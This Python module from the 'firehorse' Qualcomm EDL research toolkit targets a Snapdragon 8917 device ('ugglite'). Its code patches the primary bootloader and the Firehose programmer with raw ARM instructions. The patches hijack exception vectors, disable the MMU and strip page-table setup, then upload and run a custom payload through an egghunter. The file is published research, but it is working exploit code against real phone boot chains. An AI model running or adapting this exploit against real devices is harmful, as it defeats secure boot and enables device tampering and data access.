#
# firehrose
# By Roee Hay & Noam Hadad, Aleph Research
#

import argparse
import time
import re
import sys
import binascii
import subprocess
import os
import struct
import pt
import target
import constants
from log import *
from cmd import *
from fw import Framework as p
from fw import *
from fh import *
import target as t



def apply_breakpoints(m):
    
    cmd = Commands()
   
    m.bp_pbl(0x100000, msg="pblentry")   
    m.break_function(MODE_PBL, "pbl_sahara")
   
def apply_patches(m, target):

    cmd = Commands()

    m.patch32_programmer(0x08008CAC, 0xE51FF004)
    m.patch32_programmer(0x08008CB0, target.addr_callback(cmd.DBG_INT))

    m.patch32_programmer(0x08008CB4, 0xE51FF004)
    m.patch32_programmer(0x08008CB8,  target.addr_callback(cmd.DBG_SOFTWARE_ENTRY))

    m.patch32_programmer(0x8008CBC, 0xE51FF004)
    m.patch32_programmer(0x8008CC0, target.addr_callback(cmd.DBG_DATA_ABORT_ENTRY))

    m.patch32_programmer(0x8020158, 0xE51FF004)
    m.patch32_programmer(0x802015C, target.addr_callback(cmd.DBG_PREFETCH_ABORT_ENTRY))

    # set ourselves as manager
    m.patch32_pbl(0x110008, 0xE3E00000)

    m.patch(MODE_PBL, 0x103e8c, b"\x00\x50\x9F\xE5\x15\xFF\x2F\xE1")
    m.patch32_pbl(0x103e94, target.fh_base_programmer)

    m.patch32_pbl(0x110014, 0xE320F000) # disable MMU


    m.patch32_pbl(0x100298, 0xE3030FF0) # MOV R0, 0xAFF0
    m.patch32_pbl(0x10029c, 0xE3400021)  # MOVT R0, 0x800
    m.patch32_pbl(0x1002a0, 0xE1A0D000) # MOV SP, R0

    # set saved registers buffer - fh_base + saved_regs_offset + 0x8
    m.patch32_pbl(0x100378, target.fh_base_programmer + target.fh_saved_regs_offset + 0x08)

    # remove pt initialization
    m.nop(MODE_PBL, 0x110678, 0x1107B8) # remove initialization of page tables
    m.patch32_pbl(0x1107B8, 0xE3A05000) # MOV R5, 0 - set return value to 0

    m.patch32_pbl(0x103478, 0xEA000004) 


def magic():

        target = t.get()
        cmd = Commands()

        bbdb = BasicBlocks(target.basicblocks_db_pbl)
        
        bpm = BreakpointManager(bbdb)
        
        pm = PatchManager()

        I('applying patches and breakpoints...')
        apply_patches(pm, target)
        apply_breakpoints(bpm)
        
        I('creating pagecopy...')
        pages = set()
        pages.update(pm.get_pbl_page_numbers())
        pages.update(bpm.get_pbl_page_numbers())

        I('pages: ' + str(pages))

        pc = PageCopy(MODE_PBL, target.pbl_base_addr, target.pbl_copy_addr, pages, target_pages = [0x807D000, 0x807E000, 0x807F000, 0x807C000, 0x8068000, 0x806e000, 0x807B000])

        I('uploading firehorse data...')
        fh = Firehorse(pm, bpm, pc)
        fhdata = fh.pack()
        fhbin = file("../tmp/fh.bin","wb")
        fhbin.write(fhdata)
        fhbin.close()

        e = XMLHunter(fhdata, target.fh_base_programmer+target.fh_scratch_offset, target)
        e.send()

        I('uploading firehorse..')

        e = XMLHunter(file("../device/build/fh.payload","rb").read(), target.fh_base_programmer, target)
        e.send()

        I('initializing firehorse...')
        p.exe_cmd(target.fh_base_programmer, cmd.INIT)
        
        I('calling pbl patcher...')
       
        p.exe_cmd(target.fh_base_programmer, cmd.PBL_PATCHER)


t.add_target(name="ugglite", arch=32, 
                programmer_path=r"target/ugglite/prog_emmc_firehose_8917_ddr.mbn", 
                peekpoke_style=0, 
                saved_lr=0x0803f28f,  saved_lr_addr = 0x8057ee4,
                pbl_base_addr=0x100000,
                pbl_copy_addr=0x8068000,
                page_table_base = 0x200000,
                fh_base_programmer = 0x0210000,
                fh_scratch_offset=0x4100, fh_saved_regs_offset=0x4000, 
                egghunter_base = 0x807e000,
                basicblocks_db_pbl="target/nokia6/pbl-nokia6-bbdb.txt",
                rawprogram_xml="target/ugglite/rawprogram0.xml",
                magic=magic)